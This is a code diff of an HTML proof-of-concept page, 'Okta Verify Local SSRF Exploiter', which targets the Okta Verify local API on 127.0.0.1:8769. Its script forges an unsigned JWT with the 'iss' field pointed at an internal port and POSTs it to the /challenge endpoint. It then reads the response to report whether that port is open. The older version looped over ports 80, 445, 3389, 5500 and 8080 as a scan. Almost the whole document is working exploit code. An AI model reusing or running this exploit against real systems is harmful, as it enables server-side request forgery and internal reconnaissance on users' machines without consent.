@@ -3,43 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Okta Verify SSRF PoC (CVE-Candidate)</title>
+    <title>Okta Verify SSRF PoC (JWT Crafting)</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: #e0e0e0; padding: 20px; }
-        .container { max-width: 800px; margin: auto; background: #2d2d2d; padding: 30px; border-radius: 10px; border: 1px solid #444; }
-        h1 { color: #ff4d4d; border-bottom: 2px solid #ff4d4d; padding-bottom: 10px; }
-        .description { margin-bottom: 20px; line-height: 1.6; }
-        .controls { margin-bottom: 20px; }
-        button { background-color: #ff4d4d; color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 16px; }
+        .container { max-width: 900px; margin: auto; background: #2d2d2d; padding: 30px; border-radius: 10px; border: 1px solid #444; }
+        h1 { color: #ff4d4d; border-bottom: 2px solid #ff4d4d; padding-bottom: 10px; margin-top: 0; }
+        .flex-row { display: flex; gap: 20px; margin-bottom: 20px; }
+        .box { flex: 1; background: #1a1a1a; padding: 15px; border-radius: 5px; border: 1px solid #555; }
+        .controls { margin-bottom: 20px; background: #383838; padding: 15px; border-radius: 8px; display: flex; align-items: center; gap: 10px; }
+        input { background: #1a1a1a; color: #fff; border: 1px solid #555; padding: 10px; border-radius: 5px; width: 100px; font-size: 16px; }
+        button { background-color: #ff4d4d; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
         button:hover { background-color: #cc0000; }
-        #console { background: #000; color: #00ff00; padding: 15px; border-radius: 5px; height: 300px; overflow-y: auto; font-family: 'Courier New', Courier, monospace; border: 1px solid #555; }
-        .log-entry { margin-bottom: 5px; border-bottom: 1px solid #222; padding-bottom: 2px; }
+        #console { background: #000; color: #00ff00; padding: 15px; border-radius: 5px; height: 250px; overflow-y: auto; font-family: 'Courier New', Courier, monospace; border: 1px solid #555; }
+        pre { font-size: 12px; color: #ffa657; margin: 0; white-space: pre-wrap; word-break: break-all; }
+        .log-entry { margin-bottom: 5px; border-bottom: 1px solid #222; }
         .open { color: #00ff00; font-weight: bold; }
         .closed { color: #ff3333; }
         .info { color: #00bfff; }
+        label { font-weight: bold; color: #ccc; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <h1>Okta Verify Local SSRF Exploiter</h1>
-    <div class="description">
-        <p><strong>Vulnerability:</strong> Unauthenticated SSRF via JWT <code>iss</code> field manipulation.</p>
-        <p><strong>Target:</strong> 127.0.0.1:8769 (Okta Verify Local API)</p>
-        <p>This PoC demonstrates an <strong>Internal Port Scan</strong> to prove full control over outbound requests.</p>
+    
+    <div class="controls">
+        <label for="targetPort">Target Port:</label>
+        <input type="number" id="targetPort" value="80">
+        <button onclick="launchAttack()">Launch SSRF Attack</button>
     </div>
 
-    <div class="controls">
-        <button onclick="startExploit()">Launch Exploit & Scan</button>
+    <div class="flex-row">
+        <div class="box">
+            <label>Current Crafted JWT:</label>
+            <pre id="jwtDisplay">Click launch to generate...</pre>
+        </div>
+        <div class="box">
+            <label>JWT Decoded (Payload):</label>
+            <pre id="payloadDisplay">Waiting...</pre>
+        </div>
     </div>
 
     <div id="console">
-        <div class="log-entry info">[!] Waiting for user to launch exploit...</div>
+        <div class="log-entry info">[!] Ready. Enter a port and launch the exploit.</div>
     </div>
 </div>
 
 <script>
     const logConsole = document.getElementById('console');
+    const jwtDisplay = document.getElementById('jwtDisplay');
+    const payloadDisplay = document.getElementById('payloadDisplay');
 
     function log(message, className = "") {
         const div = document.createElement('div');
@@ -49,55 +63,53 @@
         logConsole.scrollTop = logConsole.scrollHeight;
     }
 
-    async function scanInternalPort(port) {
-        const targetUrl = `http://127.0.0.1:${port}/HISUKA_POC?`;
-        
+    const base64Url = (obj) => btoa(JSON.stringify(obj)).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
+
+    async function launchAttack() {
+        const port = document.getElementById('targetPort').value;
+        const targetUrl = `http://127.0.0.1:${port}/X0NT_POC?`;
+
+        // JWT Crafting
         const header = { "alg": "RS256", "typ": "okta-devicebind+jwt", "kid": "HB6w496FDKs9FOpPIhyLpdivBN98iN3EjHYtOu5kBkQ" };
         const payload = {
             "iss": targetUrl,
             "aud": "okta.63c081db-1f13-5084-882f-e79e1e5e2da7",
             "exp": Math.floor(Date.now() / 1000) + 3600,
             "iat": Math.floor(Date.now() / 1000),
-            "jti": "poc-" + port + "-" + Math.random(),
+            "jti": "poc-" + port + "-" + Math.random().toString(36).substring(7),
             "orgId": "org_" + port
         };
 
-        const base64Url = (obj) => btoa(JSON.stringify(obj)).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
-        const jwt = `${base64Url(header)}.${base64Url(payload)}.fake_sig`;
+        const jwt = `${base64Url(header)}.${base64Url(payload)}.fake_signature`;
+        
+        // Display in UI
+        jwtDisplay.innerText = jwt;
+        payloadDisplay.innerText = JSON.stringify(payload, null, 2);
+
+        log(`--- Initiating SSRF via Port ${port} ---`, "info");
 
         try {
-            log(`Probing Port ${port}...`, "info");
+            log(`Sending request to Local API (127.0.0.1:8769)...`, "info");
+            
             const response = await fetch("http://127.0.0.1:8769/challenge", {
                 method: "POST",
-                mode: "cors", // Note: This might trigger CORS if Okta doesn't allow it, but for local PoC it usually works.
+                mode: "cors", 
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ "challengeRequest": jwt })
             });
-            
-            const result = await response.json();
-            const errorMsg = result.error || "";
 
-            if (errorMsg.includes("Base-64") || errorMsg.includes("padding")) {
-                log(`[SUCCESS] Port ${port} is OPEN - SSRF Verified!`, "open");
-            } else if (errorMsg.includes("refused") || errorMsg.includes("sending the request")) {
-                log(`[FAILED] Port ${port} is CLOSED`, "closed");
+            log(`Status Code Received: ${response.status}`, response.status === 401 ? "open" : "");
+
+            if (response.status === 401) {
+                log(`[SUCCESS] Status 401 Detected! Port ${port} is OPEN.`, "open");
+                log(`The local service at port ${port} responded to the SSRF request.`, "open");
             } else {
-                log(`[?] Port ${port} Response: ${errorMsg.slice(0, 40)}...`);
+                log(`[FAILED] Received Status ${response.status}. Port might be closed or filtered.`, "closed");
             }
-        } catch (err) {
-            log(`[-] Error on Port ${port}: Could not reach Local API. Ensure Okta Verify is running.`, "closed");
-        }
-    }
 
-    async function startExploit() {
-        log("--- Exploit Started ---", "info");
-        const ports = [80, 445, 3389, 5500, 8080];
-        for (const port of ports) {
-            await scanInternalPort(port);
-            // Small delay to keep UI responsive
-            await new Promise(r => setTimeout(r, 600));
+        } catch (err) {
+            log(`[-] Connection Error: Local API unreachable or blocked by CORS.`, "closed");
         }
-        log("--- Scan Completed ---", "info");
     }
 </script>
 
